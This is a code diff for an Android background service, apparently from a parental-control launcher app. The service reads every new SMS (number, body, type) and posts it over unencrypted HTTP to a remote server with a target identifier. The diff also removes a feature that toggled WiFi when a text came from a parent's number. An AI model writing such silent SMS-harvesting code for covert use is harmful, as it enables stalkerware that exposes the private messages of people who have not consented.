@@ -37,6 +37,7 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.HashMap;
@@ -51,7 +52,7 @@ public class SmsHistory extends Service {
     public SmsHistory() {
         smsObserver = new SmsHistory.SMSObserver();
     }
-    //private static final String URL_sms = "http://"+ WSadressIP.WSIPChoko+"/kidslanch_serv/web/index.php/sms";
+    private static final String URL_sms = "http://"+ WSadressIP.WSIPChoko+"/kidslanch_serv/web/index.php/sms/add";
 
     @Override
     public void onCreate() {
@@ -102,14 +103,14 @@ public class SmsHistory extends Service {
         public void onChange(boolean selfChange, Uri uri) {
             super.onChange(selfChange, uri);
 
-            CatchWifiSms();//Your code here
 
 
+            readSMS();
             lastTimeofCall = System.currentTimeMillis();
 
             if(lastTimeofCall - lastTimeofUpdate > threshold_time){
 
-                readSMS();
+
 
 
                 lastTimeofUpdate = System.currentTimeMillis();
@@ -127,32 +128,25 @@ public class SmsHistory extends Service {
 
             Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
             int totalSMS = 0;
-           // if (c != null) {
 
-                totalSMS = c.getCount();
-                // if (c.moveToFirst()) {
-                //  if(c.getCount()!=0){
-                  //c.moveToNext();
-                // c.moveToFirst();
-                  //  for (int j = 0; j < totalSMS; j++) {
-
-
-            if (c.getCount() > 0) {
-
-              while (c.moveToNext()) {
-
+           if(c.getCount()>0){
+              c.moveToFirst();
 
                         String smsId =c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID));
                         String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                         String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                         String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
 
-                        Date dateFormat = new Date(Long.valueOf(smsDate));
+
+                  Date cc = Calendar.getInstance().getTime();
+                  String date = cc.toString();
 
 
-                   Date cc = Calendar.getInstance().getTime();
-                  // String datee = cc.toString();
-                   String datee = dateFormat.toString();
+
+                  SimpleDateFormat df = new SimpleDateFormat("dd-MM-yyyy hh:mm");
+                  String datee = df.format(cc);
+
+
                         String type=null;
                         switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                             case Telephony.Sms.MESSAGE_TYPE_INBOX:
@@ -168,11 +162,12 @@ public class SmsHistory extends Service {
                                 break;
                         }
 
-                        Log.v("abcdefghijklmnopqrz",number+body+type+dateFormat);
+                        Log.v("abcdefghijklmnopqrz",number+body+type);
                         //Toast.makeText(this, number+body+type+dateFormat, Toast.LENGTH_SHORT).show();
                    saveSMS(smsId, datee,type,number,body);
+                     NotifDB(type , number);
                     }
-                }
+               // }
 
                 c.close();
 
@@ -184,11 +179,12 @@ public class SmsHistory extends Service {
 
             try{
                 Log.d("onrecieve", "on recieveeeeeeeeee SMS");
-                final String URL = "http://"+ WSadressIP.WSIP+"/launcher/MAddSms.php";
-                StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
+               // final String URL = "http://"+ WSadressIP.WSIP+"/launcher/MAddSms.php";
+                StringRequest stringRequest = new StringRequest(Request.Method.POST, URL_sms, new Response.Listener<String>() {
                     @Override
                     public void onResponse(String response) {
                         if(response.contains("success")) {
+
                         }
                     }
                 }, new Response.ErrorListener() {
@@ -202,7 +198,7 @@ public class SmsHistory extends Service {
                         Map<String, String> params = new HashMap<>();
                         params.put("Content-Type","application/x-www-form-urlencoded");
                             params.put("id_target", MainActivity.id_target);
-                            params.put("smsid",smsid);
+                         //   params.put("smsid",smsid);
                             params.put("date",sdate);
                             params.put("type",stype);
                             params.put("number",snumber);
@@ -219,162 +215,23 @@ public class SmsHistory extends Service {
         }
 
 
-    public void CatchWifiSms(){
 
 
-        ContentResolver cr = getContentResolver();
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
-
-            Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
-            if (c.getCount() > 0) {
 
 
-                c.moveToNext();
-
-                String smsId =c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID));
-                String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
-                String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
-                String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
-                Date dateFormat = new Date(Long.valueOf(smsDate));
 
 
-                Date cc = Calendar.getInstance().getTime();
-                String datee = cc.toString();
-                String type=null;
-                switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
-                    case Telephony.Sms.MESSAGE_TYPE_INBOX:
-                        type = "inbox";
-                        break;
-                    case Telephony.Sms.MESSAGE_TYPE_SENT:
-                        type = "sent";
-                        break;
-                    case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
-                        type = "outbox";
-                        break;
-                    default:
-                        break;
-                }
+    final String   URL_Notif =  "http://"+ WSadressIP.WSIPChoko+"/kidslanch_serv/web/index.php/notifs/add";
 
-                Log.v("7ell sakar el wifi tawa","aaaaaaaaaaaaaaaaaaabbbbbbbbbbbbb");
-                wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
-              /*  if(type.equals("inbox")&& body.equals("Wifi")){
+    public void NotifDB(final String typedOfSMS , final String number) {
 
 
-                    if(wifiManager.getWifiState() == WifiManager.WIFI_STATE_ENABLED){
-                        Log.d("gggggggggggg", "Starting now ..............");
-                       // wifiManager.setWifiEnabled(false);
-                        updateWiFiStateInDB("0");
 
-
-                    }
-                    else if(wifiManager.getWifiState() == WifiManager.WIFI_STATE_DISABLED){
-                        Log.d("gggggggggggg", "Starting now ..............");
-                       // wifiManager.setWifiEnabled(true);
-                       updateWiFiStateInDB("1");
-
-                    }
-                    getWifiState();
-                }*/
-                Log.v("open/closeWifi ","-------------------- test "+number);
-                if(type.equals("inbox")&& body.equals("Open Wifi") && MainActivity.parent_number.equals(number)){
-                        wifiManager.setWifiEnabled(true);
-                        updateWiFiStateInDB("1");
-
-
-                }
-                if(type.equals("inbox")&& body.equals("Close Wifi") && MainActivity.parent_number.equals(number)){
-                    updateWiFiStateInDB("0");
-                    wifiManager.setWifiEnabled(false);
-
-Log.v("open/closeWifi ","-------------------- ok closed "+number);
-
-                }
-            }
-
-            c.close();
-
-        }
-    }
-    public void updateWiFiStateInDB( final String StateWifi) {
-
-
-        try{
-            Log.d("update wifiState in DB", "Starting now ..............");
-            final String URL = "http://"+ WSadressIP.WSIP+"/launcher/MUpdateWifiStatus.php";
-            StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
-                @Override
-                public void onResponse(String response) {
-                    if(response.contains("success")) {
-                       if(StateWifi.equals("0")){
-                            //wifiManager.setWifiEnabled(false);
-                        }
-
-                    }
-                }
-            }, new Response.ErrorListener() {
-                @Override
-                public void onErrorResponse(VolleyError error) {
-                   // Toast.makeText(getApplicationContext(),"failed to login",Toast.LENGTH_SHORT).show();
-                }
-            }){
-                @Override
-                protected Map<String, String> getParams() throws AuthFailureError {
-                    Map<String, String> params = new HashMap<>();
-                    params.put("Content-Type","application/x-www-form-urlencoded");
-                    params.put("id_target",MainActivity.id_target);
-                    params.put("wifistate",StateWifi);
-
-                    return params;
-                }
-            };
-            Log.d("mytag", "OK IM HERE EVERYONE SMS"); // THIS WORKS
-            //adding our stringrequest to queue
-            MySingleton.getInstance(getApplicationContext()).addToRequestQueue(stringRequest);
-        } catch (Exception e){
-            e.printStackTrace();
-        }
-    }
-
-    private static final String URL_Activities = "http://"+ WSadressIP.WSIP+"/launcher/MgetWifiState.php";
-
-    private void getWifiState() {
-
-        final Integer[] statee = new Integer[1];
-        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
-        StringRequest stringRequest = new StringRequest(Request.Method.POST, URL_Activities,
+        StringRequest stringRequest = new StringRequest(Request.Method.POST, URL_Notif,
                 new Response.Listener<String>() {
                     @Override
                     public void onResponse(String response) {
-                        try {
 
-                            JSONArray array = new JSONArray(response);
-
-
-                            for (int i = 0; i < array.length(); i++) {
-
-
-                                JSONObject product = array.getJSONObject(i);
-                                statee[0] = product.getInt("wifistate");
-
-
-                            }
-
-                            if(statee[0] == 1){
-                                Log.v("miu","miauuuuuuuuuuuuuuuuuuuu");
-                                wifiManager.setWifiEnabled(true);
-
-                            }else if(statee[0] == 0){
-                                Log.v("miu","miauuuuuuuuuuuuuuuuuuuu2");
-                                wifiManager.setWifiEnabled(false);
-                            }
-
-
-
-
-                        } catch (JSONException e) {
-
-                            e.printStackTrace();
-                        }
                     }
                 },
                 new Response.ErrorListener() {
@@ -387,12 +244,19 @@ Log.v("open/closeWifi ","-------------------- ok closed "+number);
             protected Map<String, String> getParams() throws AuthFailureError {
                 Map<String, String> params = new HashMap<>();
                 params.put("Content-Type","application/x-www-form-urlencoded");
-                params.put("id_target",MainActivity.id_target);
+                Date c = Calendar.getInstance().getTime();
+                SimpleDateFormat df = new SimpleDateFormat("dd-MM-yyyy hh:mm:ss");
+                String formattedDate = df.format(c);
+                params.put("date", formattedDate);
+                params.put("content", "SMS: "+typedOfSMS+" number: "+number);
+                params.put("id_target", MainActivity.id_target);
                 return params;
             }
-        };;
+        };
 
         //adding our stringrequest to queue
         Volley.newRequestQueue(SmsHistory.this).add(stringRequest);
+
     }
+
 }
